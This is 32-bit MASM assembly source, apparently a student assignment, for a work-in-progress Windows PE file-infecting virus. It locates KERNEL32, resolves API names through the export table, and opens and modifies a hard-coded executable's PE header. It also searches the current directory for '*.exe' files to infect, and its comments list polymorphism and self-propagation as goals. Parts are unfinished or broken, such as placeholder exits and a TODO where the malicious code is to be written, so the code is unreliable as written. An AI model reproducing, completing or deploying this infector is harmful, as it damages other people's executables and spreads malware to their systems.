; donothing.asm FOR 32 BIT archs only
; new section -> addr la plus grande d une section + sa taille
; si pas la place -> quit
; bonus: UPX unpacker
; bonus: infecte peut infecter
; bonus: ne pas modifier entry point
; bonus: polymorphique obligatoire

.386
.model flat, stdcall
option casemap: none

    include \masm32\include\windows.inc
    include \masm32\include\user32.inc
    include \masm32\include\kernel32.inc

    include \masm32\include\masm32.inc
    include \masm32\include\msvcrt.inc

    includelib \masm32\lib\user32.lib
    includelib \masm32\lib\kernel32.lib

    includelib \masm32\lib\masm32.lib
    includelib \masm32\lib\msvcrt.lib

.data
; No data here please, put it at the end of the .code section

.code

start:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Find the KERNEL32 base address, works at the entry point of the program
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     esi,[esp]
    and     esi,0FFFF0000h

find_PE:
    sub     esi,1000h           ; find the DOS Header (aligned on 0x1000)
    cmp     word ptr [esi],"ZM"
    jne     find_PE

    mov     ecx,[esi+3Ch]       ; offset to EXE header
    lea     edi,[esi+ecx]       ; address of the EXE header
    cmp     word ptr [edi],"EP" ; double check with the "PE" magic
    jne     exit_fail

; DELTA OFFSET to retrieve any variable address
    call deltaoffset
deltaoffset:
    pop ebp ; put EIP in ebp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; TUTORIAL: how to use function and data
; Call a kernel32 routine:
; Important: ebp, esi and edi are needed each time, keep them safe ;)
; STEP 1 -> create routine_b at the end of the file
; STEP 2 -> use delta offset to get it's address
; mov     eax,ebp ; EBP -> real address of delta offset
; add     eax,offset ExitProcess_b
; sub     eax,offset deltaoffset
; STEP 3 -> call ent_get_function_addr with "routine"
; push    eax
; push    edi ; PE header
; push    esi ; DOS header
; call    ent_get_function_addr
; STEP 4 -> push args && call the function
; push    2
; call    eax ; will call ExitProcess with exitval = 2
; STEP 5 -> verify with echo %errorlevel% it should print 2 in this case
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    ; Get CreateFile addr
    mov     eax,ebp
    add     eax,offset CreateFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    edi ; PE header
    push    esi ; DOS header
    call    ent_get_function_addr

    ; TODO: foreach file in current dir
    ; Open a file (TODO: use each file)
    push    0 ; attr template
    push    FILE_ATTRIBUTE_NORMAL 
    push    OPEN_EXISTING
    push    0 ; default security
    mov     ebx,FILE_SHARE_READ
    xor     ebx,FILE_SHARE_WRITE
    push    ebx ; read && write
    mov     ebx,GENERIC_READ
    xor     ebx,GENERIC_WRITE
    push    ebx ; read && write
    mov     ebx,ebp
    add     ebx,offset testFile
    sub     ebx,offset deltaoffset
    push    ebx ; .exe path
    call    eax ; CreateFile()

    push    eax ; save the fd
    ; Create a new section
    push    eax ; File descriptor
    push    ebp ; Delta offset
    push    edi ; PE header
    push    esi ; DOS header
    call new_code_section

    pop     ebx ; restore the fd    
    mov     eax,ebp
    add     eax,offset CloseHandle_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    edi ; PE header
    push    esi ; DOS header
    call    ent_get_function_addr  
    ; CloseHandle(fd)
    push    ebx
    call    eax  

    call exit_success
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Create a new code section in the executable
; Return the old entry point (to resume execution after our payload) or 0
; 3 params:
;   pointer to the DOS header -> ebp + 8
;   pointer to the PE header -> ebp + 12
;   address of the delta offset -> ebp + 16
;   file descriptor to a .exe (r+w) -> ebp + 20
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
new_code_section:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    ; Get ReadFile addr
    mov     eax,[ebp+16]
    add     eax,offset ReadFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp - 16]
    ; Get WriteFile addr
    mov     eax,[ebp+16]
    add     eax,offset WriteFile_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp-20]
    ; Get SetFilePointer addr
    mov     eax,[ebp+16]
    add     eax,offset SetFilePointer_b
    sub     eax,offset deltaoffset
    push    eax ; Address of the func name
    push    [ebp+12] ; PE header
    push    [ebp+8]  ; DOS header
    call    ent_get_function_addr
    push    eax ; [ebp-24]

    ;[ebp-16] => readfile addr
    ;[ebp-20] => writefile addr
    ;[ebp-24] => setfilepointer addr
    ; make room for a read of 512 at @esp
    sub     esp,512
    mov     esi,esp ; save esp

    ; Read(fd, esi, 2, 0, 0)
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    2
    push    esi
    push    [ebp+20]
    call    ebx
    cmp     word ptr [esi],"ZM"
    jne     exit_fail ; we should have MZ in the stack

    ; Move to the new offset header field in the PE header
    mov     ebx,[ebp-24]
    push    FILE_BEGIN
    push    0
    push    03Ch
    push    [ebp + 20]
    call    ebx

    ; Read(fd, esi, 4, 0, 0)
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    4
    push    esi
    push    [ebp+20]
    call    ebx

    xor eax,eax
    mov eax,[esi] ; Get the offset to the PE header

    ; Move to the PE header
    mov     ebx,[ebp-24]
    push    FILE_BEGIN
    push    0
    push    eax
    push    [ebp+20]
    call    ebx

    ; Read(fd, esi, 2, 0, 0)
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    4
    push    esi
    push    [ebp+20]
    call    ebx
    cmp     word ptr [esi],"EP"
    jne     exit_fail ; we should have EP in the stack

    ; Move to the Number of section field
    mov     ebx,[ebp-24]
    push    FILE_CURRENT
    push    0
    push    2
    push    [ebp+20]
    call    ebx

    ; Read(fd, esi, 4, 0, 0) nsection
    mov     ebx,[ebp-16]
    push    0
    push    0
    push    2
    push    esi
    push    [ebp+20]
    call    ebx

    ; inc the number of section
    xor ecx,ecx
    mov cx,[esi]
    inc cx 
    mov [esi],cx

    ; Move to the Number of section field
    mov     ebx,[ebp-24]
    push    FILE_CURRENT
    push    0
    push    -2
    push    [ebp+20]
    call    ebx

    ; Write the updated number of section
    mov     ebx,[ebp-20]
    push    0
    push    0
    push    2
    push    esi
    push    [ebp+20]
    call    ebx

    ; cleanup/return
    add     esp,12 ; alloc for func ptrs
    add     esp,512 ; alloc for read/write
    pop     edi
    pop     esi
    pop     ebx
    mov     esp,ebp
    pop     ebp
    ret     16







    ; TODO: si retourne NULL, pour le moment, on annule
    ; et passe a la suite
    ; sinon, writefile le code malveillant




;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Find first file to infect
; following filter '*.exe', exit_fail if none is found
; no param
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_first:

    mov     eax, ebp ; EBP -> real address of delta offset
    add     eax, offset FindFirstFile_b
    sub     eax, offset deltaoffset

    ; call ent_get_function_addr with "FindFirstFileA" (A=Ansii)
    push    eax
    push    edi ; PE header
    push    esi ; DOS header
    call    ent_get_function_addr

    ; allocate sizeof(struct WIN32_FIND_DATAA) on stack
    push    ebp
    mov     ebp, esp
    sub     esp, 320

    ; push args && call the function: arg2 WIN32_FIND_DATAA, arg1 filter '*.exe'
    xor     ecx, ecx
    xor     ebx, ebx
    lea     ecx, [ebp - 320]
    lea     ebx, [filter]
    push    ecx
    push    ebx
    call    eax

    ; If it hasn't found any file, jumps to exit_fail
    cmp     eax, -1
    jz      exit_fail

    ; Else save the handle (dd) in ebx // TODO: has to be changed, too unstable
    xor     ebx, ebx
    mov     ebx, eax ; store handle address
    ;push    ebx

    ; save WIN32_FIND_DATAA in edx
    ;xor     edx, edx
    ;lea     edx, [ebp - 320]
    ;mov     edx, [ebp - 320]
    ; DEBUG print first .exe found
    ;add     edx, 44
    ;invoke  StdOut, edx
    ;sub     edx, 44

    ; infect found .exe file
    push    edi
    push    esi
    sub     ebp, 276
    mov     esi, ebp
    mov     edi, ebx
    cld
    mov     ecx, 260
    rep     movsb
    add     ebp, 276
    pop     esi
    pop     edi

    ; restore ebp
    mov     esp, ebp
    pop     ebp

    push    ebx
    call    infect_file


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Find next file(s) to infect
; following filter '*.exe', exit_fail if none is found
; no param
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_next:
    ;find next .exe file, if exists

    xor     eax, eax
    mov     eax, ebp ; EBP -> real address of delta offset
    add     eax, offset FindNextFile_b
    sub     eax, offset deltaoffset

    ; call ent_get_function_addr with "FindNextFileA" (A=Ansii)
    push    eax
    push    edi ; PE header
    push    esi ; DOS header
    call    ent_get_function_addr

    ; allocate sizeof(struct WIN32_FIND_DATAA) on stack
    push    ebp
    mov     ebp, esp
    sub     esp, 320

    ; push args && call the function: arg2 WIN32_FIND_DATAA,
    ; arg1 file handle stored in ebx from FindFirstFileA
    xor     ecx, ecx
    xor     edx, edx
    lea     ecx, [ebp - 320]
    mov     edx, ebx
    push    ecx
    push    edx
    call    eax

    ; if no file found, exit_fail (regular exit?)
    cmp     eax, 00h
    jz      exit_fail

    ; DEBUG print next .exe found
    ;xor     eax, eax
    ;lea     eax, [ebp - 276]
    ;invoke  StdOut, eax

    ; restore ebp
    mov     esp, ebp
    pop     ebp

    xor     edx, edx
    lea     edx, [ebp - 320]
    ; infect next .exe file
    call    infect_file

    ; loop for more .exe files
    jmp     find_next

    ; shouldn't reach that
    call    exit_success



; Work in progress
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Iterate on all section headers (ebx)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ;lea     ebx,[edi+SIZEOF IMAGE_NT_HEADERS]   ; address of the first IMAGE_SECTION_HEADER
    ;mov     dx,[edi+6h]                         ; number of sections

;iterate_section:

    ;cmp     dx,0
    ;jle     exit_success ; my work here is done, I have to goooo

    ; get next section header's address
    ;add     ebx,SIZEOF IMAGE_SECTION_HEADER
    ;dec     edx
    ;jmp     iterate_section







;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Explore the ENT (Export Name Table) of KERNEL32
; And return the matching function address
; 3 params:
;   pointer to the DOS header -> ebp + 8
;   pointer to the PE header -> ebp + 12
;   pointer to the function name -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_get_function_addr:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     edi,[ebp+8]
    mov     esi,[ebp+12]
    mov     esi,[esi+78h]       ; EXPORT table (RVA)
    mov     edx,[esi+edi+18h]   ; Number of names
    mov     ebx,[esi+edi+20h]   ; Address of names (RVA)
    add     ebx,edi             ; Address of names (absolute)

    ; STEP 1: get the name index in the name array
    push    [ebp + 16]
    push    edx
    push    [ebp+8]
    push    ebx
    call    ent_find_name

    ; STEP 2: get the ordinal in the ordinal array
    push    eax                 ; Index of name
    mov     edx,[esi+edi+10h]   ; Base ordinal
    push    edx
    mov     ebx,[esi+edi+24h]   ; Address of ordinals (RVA)
    add     ebx,edi             ; Address of ordinals (absolute)
    push    ebx
    call    ent_ordinal

    ; STEP 3: get the address in the function address array
    push    [ebp+8]
    push    eax
    mov     ebx,[esi+edi+1Ch]   ; Address of function addresses (RVA)
    add     ebx,edi             ; Address of function addresses (absolute)
    push    ebx
    call    ent_function

    pop     edi
    pop     esi
    pop     ebx
    mov     esp,ebp
    pop     ebp
    ret     12

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Returns the index the function name
; 4 params:
;   pointer to the ENT name array (absolute) -> ebp + 8
;   pointer to the DOS header (absolute) -> ebp + 12
;   Number of names -> ebp + 16
;   pointer to the name to look for -> ebp + 20
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_find_name:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+20]    ; Name to look for
    mov     edx,[ebp+16]    ; Number of names
    mov     ecx,0           ; Initialize the counter

ent_next_name:

    mov     ebx,[ebp+8]
    mov     ebx,[ebx+ecx*4] ; First name pointer (RVA)
    mov     eax,[ebp+12]
    add     ebx,eax         ; First name pointer

    push    ecx             ; Save edx
    push    edx             ; Save edx
    nop
    nop ; Markers for debugging
    nop
    push    ebx
    push    esi
    call    strcmp_
    pop     edx             ; Restore edx
    pop     ecx             ; Restore ecx

    cmp     eax,0           ; Did we find the string?
    je      ent_name_success

    dec     edx
    jz      ent_name_done   ; No more names

    inc     ecx
    jmp     ent_next_name   ; Get next name

    ent_name_success:
    mov     eax,ecx
    jmp     ent_name_done

    ent_name_fail:
    mov     eax,-1          ; Return NULL, failed
    jmp     exit_fail

    ent_name_done:

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     16

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; sub-routine: returns the name ordinal
; 3 params:
;   pointer to the ENT ordinal array (absolute) -> ebp + 8
;   base ordinal DWORD -> ebp + 12
;   index of the function name -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_ordinal:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]     ; ordinal array (WORD*)
    mov     edx,[ebp+12]    ; base ordinal
    mov     ecx,[ebp+16]    ; index of function name

    xor     eax,eax
    mov     ax,[esi+ecx*2]

    ; XXX: adding base gives a wrong ordinal...
    ; the one already there is correct so well... oO
    ;add     eax,edx

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     12

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; sub-routine: returns the function's address
; 2 params:
;   pointer to the ENT function array (absolute) -> ebp + 8
;   function ordinal (DWORD) -> ebp + 12
;   pointer to DOS header -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_function:

    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]     ; function array
    mov     ecx,[ebp+12]    ; index
    mov     edx,[ebp+16]    ; DOS header of KERNEL32

    mov     eax,[esi+ecx*4] ; function RVA
    add     eax,edx         ; function address

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     12

strlen_:
    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]
    xor     eax,eax ; zero out eax
    xor     ebx,ebx ; zero out ebx
strlen_iterate:
    mov     bl,[esi]
    test    bl,bl
    jz      strlen_done
    inc     eax
    inc     esi
    jmp     strlen_iterate
strlen_done:
    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     4

strcmp_:
    ; Set up a stack frame
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]
    mov     edi,[ebp+12]
    xor     eax,eax ; zero out eax
    xor     ebx,ebx ; zero out ebx
strcmp_iterate:
    mov     bl,[esi]
    mov     al,[edi]
    test    bl,bl
    ; end of string
    jz      strcmp_done
    test    al,al
    jz      strcmp_done
    ; check for difference
    cmp     al,bl
    jne     strcmp_done
    inc     esi
    inc     edi
    jmp     strcmp_iterate

strcmp_done:
    sub     eax,ebx

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     8

infect_file:
    ; infect found .exe file

    ; save pointer to WIN32_FIND_DATAA
    ;push    edx

    xor     eax, eax
    mov     eax, ebp ; EBP -> real address of delta offset
    add     eax, offset CreateFile_b
    sub     eax, offset deltaoffset

    ; call ent_get_function_addr with "CreateFileA" (A=Ansii)
    push    eax
    push    edi ; PE header
    push    esi ; DOS header
    call    ent_get_function_addr

    push    ebp
    mov     ebp, esp
    ; restore pointer to WIN32_FIND_DATAA
    ;pop     edx

    ; open file
    push    00h ; no template handle
    push    80h ; flag FILE_ATTRIBUTE_NORMAL
    push    03h ; flag OPEN_EXISTING
    push    00h
    push    00h
    push    0C0000000h ; flag GENERIC_WRITE | GENERIC_READ
    push    [ebp + 8]
    call    eax

    ; return if file couldn't be opened
    cmp     eax, -1 ; INVALID_HANDLE_VALUE
    jz      end_infect_file

    ; else
    jmp     exit_success

    ; set up stack frame
    ;push    ebp
    ;mov     ebp, esp
    ;sub     esp, 2

    ; virus size + win32_find_data.nFileSizeLow
    ;xor     ecx, ecx
    ;lea     ecx, [ebp - 2]
    ;mov     ecx, virusSize ; virus size
    ;add     edx, 38 ; win32_find_data.nFileSizeLow
    ;add     ecx, edx
    ;sub     edx, 38

    ;mov     [ebp - 2], virusSize
    ;add     edx, 38 ; win32_find_data.nFileSizeLow
    ;add     [ebp - 2], edx
    ;sub     edx, 38

    ; restore ebp
    ;mov     esp, ebp
    ;pop     ebp

    end_infect_file:
        ret    8

exit_success:
    ; WIN
    mov     eax,042h
    call    eax

exit_fail:
    ; For debug :D
    mov     eax,0DEADBEEFh
    call    eax

; All the virus data: use delta offset
; @MARC: ca ne peut pas marcher sauf si tu 
; force la zone en r/w avec mprotect?
virus_data:
_data:
   filetime struct
       dwLowDateTime     DWORD     ?
       dwHighDateTime    DWORD     ?
   filetime ends

   find_data struct
       dwFileAttributes       DWORD ?
       ftCreationTime         filetime <?>
       ftLastAccessTime       filetime <?>
       ftLastWriteTime        filetime <?>
       nFileSizeHigh          DWORD ?
       nFileSizeLow           DWORD ?
       dwReserved0            DWORD ?
       dwReserved1            DWORD ?
       cFileName              BYTE 260 dup (?)
       cAlternateFileName     BYTE 14  dup (?)
   find_data ends

   ;win32_find_data find_data <?>
   win32_find_data WIN32_FIND_DATA <0>
   ;FileHandleFind  dd ?
   filter          db "*.exe",0
   testFile        db "C:\Users\Benjamin\Documents\GitHub\donothing\TP0\donothing_2.exe",0
   testStr         db "bite",0
   virusSize       equ jambi_end - start

   FindFirstFile_b  db  "FindFirstFileA",0
   FindNextFile_b   db  "FindNextFileA",0
   ExitProcess_b    db  "ExitProcess",0
   Beep_b           db  "Beep",0
   CreateFile_b     db  "CreateFileA",0
   WriteFile_b      db  "WriteFile",0
   CloseHandle_b    db  "CloseHandle",0
   SetFilePointer_b db  "SetFilePointer",0
   ReadFile_b       db  "ReadFile",0

jambi_end:
end start
